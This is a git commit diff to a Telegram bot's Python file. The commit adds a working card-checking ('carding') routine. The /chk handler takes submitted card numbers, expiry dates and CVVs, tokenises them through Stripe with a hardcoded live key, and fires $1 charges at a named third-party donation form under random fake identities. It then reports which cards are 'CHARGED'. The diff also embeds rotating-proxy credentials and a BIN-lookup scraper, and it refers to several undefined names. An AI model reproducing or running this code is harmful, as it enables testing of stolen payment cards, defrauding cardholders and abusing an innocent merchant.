56382c36338661284e2eab11ca421e28784c103c
chrichrilaubie <chrichrilaubie@gmail.com>
2025-03-13 04:03:23 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,4 @@
-import logging 
+import logging
 import os
 import requests
 import time
@@ -13,6 +13,7 @@ from aiogram.utils.exceptions import Throttled
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from bs4 import BeautifulSoup as bs
 
+
 # Configure vars get from env or config.yml
 CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
 TOKEN = os.getenv('TOKEN', CONFIG['token'])
@@ -21,7 +22,7 @@ PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
 OWNER = int(os.getenv('OWNER', CONFIG['owner']))
 ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))
 
-# Initialize bot and dispatcher (Ensure this happens before handlers)
+# Initialize bot and dispatcher
 storage = MemoryStorage()
 bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
 dp = Dispatcher(bot, storage=storage)
@@ -37,8 +38,30 @@ BOT_USERNAME = bot_info.username
 BOT_NAME = bot_info.first_name
 BOT_ID = bot_info.id
 
-# Your other code below (handlers, functions, etc.)
-# For example:
+# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
+proxies = {
+           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
+           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
+}
+
+session = requests.Session()
+
+# Random DATA
+letters = string.ascii_lowercase
+First = ''.join(random.choice(letters) for _ in range(6))
+Last = ''.join(random.choice(letters) for _ in range(6))
+PWD = ''.join(random.choice(letters) for _ in range(10))
+Name = f'{First}+{Last}'
+Email = f'{First}.{Last}@gmail.com'
+UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
+
+
+async def is_owner(user_id):
+    return user_id == OWNER
+
+async def is_card_valid(card_number: str) -> bool: return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
+
+
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
 async def helpstr(message: types.Message):
     # await message.answer_chat_action('typing')
@@ -53,7 +76,54 @@ Cmds /chk /info /bin'''
     await message.answer(MSG, reply_markup=keyboard_markup,
                         disable_web_page_preview=True)
 
-# Example /chk command handler
+
+@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
+async def info(message: types.Message):
+    if message.reply_to_message:
+        user_id = message.reply_to_message.from_user.id
+        is_bot = message.reply_to_message.from_user.is_bot
+        username = message.reply_to_message.from_user.username
+        first = message.reply_to_message.from_user.first_name
+    else:
+        user_id = message.from_user.id
+        is_bot = message.from_user.is_bot
+        username = message.from_user.username
+        first = message.from_user.first_name
+    await message.reply(f'''
+═════════╕
+<b>USER INFO</b>
+<b>USER ID:</b> <code>{user_id}</code>
+<b>USERNAME:</b> @{username}
+<b>FIRSTNAME:</b> {first}
+<b>BOT:</b> {is_bot}
+<b>BOT-OWNER:</b> {await is_owner(user_id)}
+╘═════════''')
+
+
+@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
+async def binio(message: types.Message):
+    await message.answer_chat_action('typing')
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    BIN = message.text[len('/bin '):]
+    if len(BIN) < 6:
+        return await message.reply(
+                   'Send bin not ass'
+        )
+    r = requests.get(
+               f'https://bins.ws/search?bins={BIN[:6]}'
+    ).text
+    soup = bs(r, features='html.parser')
+    k = soup.find("div", {"class": "page"})
+    INFO = f'''
+{k.text[62:]}
+SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
+BOT⇢ @{BOT_USERNAME}
+OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
+'''
+    await message.reply(INFO)
+
+
 @dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
     await message.answer_chat_action('typing')
@@ -67,9 +137,138 @@ async def ch(message: types.Message):
         await message.reply('<b>Too many requests!</b>\n'
                             f'Blocked For {ANTISPAM} seconds')
     else:
-        # Your card checking code here
-        pass
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/chk '):]
 
-# Start the bot
+        if len(cc) == 0:
+            return await message.reply("<b>No Card to chk</b>")
+
+        x = re.findall(r'\d+', cc)
+        ccn = x[0]
+        mm = x[1]
+        yy = x[2]
+        cvv = x[3]
+        if mm.startswith('2'):
+            mm, yy = yy, mm
+        if len(mm) >= 3:
+            mm, yy, cvv = yy, cvv, mm
+        if len(ccn) < 15 or len(ccn) > 16:
+            return await message.reply('<b>Failed to parse Card</b>\n'
+                                       '<b>Reason: Invalid Format!</b>')   
+        BIN = ccn[:6]
+        if BIN in BLACKLISTED:
+            return await message.reply('<b>BLACKLISTED BIN</b>')
+        if await is_card_valid(ccn) != True:
+            return await message.reply('<b>Invalid luhn algorithm</b>')
+        # get guid muid sid
+        headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+
+        m = s.post('https://m.stripe.com/6', headers=headers)
+        r = m.json()
+        Guid = r['guid']
+        Muid = r['muid']
+        Sid = r['sid']
+
+        postdata = {
+            "guid": Guid,
+            "muid": Muid,
+            "sid": Sid,
+            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
+            "card[name]": Name,
+            "card[number]": ccn,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "card[cvc]": cvv
+        }
+
+        HEADER = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "user-agent": UA,
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "accept-language": "en-US,en;q=0.9"
+        }
+
+        pr = s.post('https://api.stripe.com/v1/tokens',
+                          data=postdata, headers=HEADER)
+        Id = pr.json()['id']
+        if pr.status_code != 200:
+            return await message.reply("<b>Site is Dead</b>")
+        nonce = s.get("https://www.hwstjohn.com/pay-now/")
+        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
+        # hmm
+        load = {
+            "action": "wp_full_stripe_payment_charge",
+            "formName": "default",
+            "formNonce": form,
+            "fullstripe_name": Name,
+            "fullstripe_email": Email,
+            "fullstripe_custom_amount": "1",
+            "fullstripe_amount_index": 0,
+            "stripeToken": Id
+        }
+
+        header = {
+            "accept": "application/json, text/javascript, */*; q=0.01",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "user-agent": UA,
+            "accept-language": "en-US,en;q=0.9"
+        }
+
+        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
+                          data=load, headers=header)
+        msg = rx.json()['msg']
+
+        toc = time.perf_counter()
+
+        if 'true' in rx.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #CHARGED 1$
+<b>MSG</b>➟ {msg}
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'security code' in rx.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #CCN
+<b>MSG</b>➟ {msg}
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'false' in rx.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #Declined
+<b>MSG</b>➟ {msg}
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ DEAD
+<b>MSG</b>➟ {rx.text}
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, loop=loop)
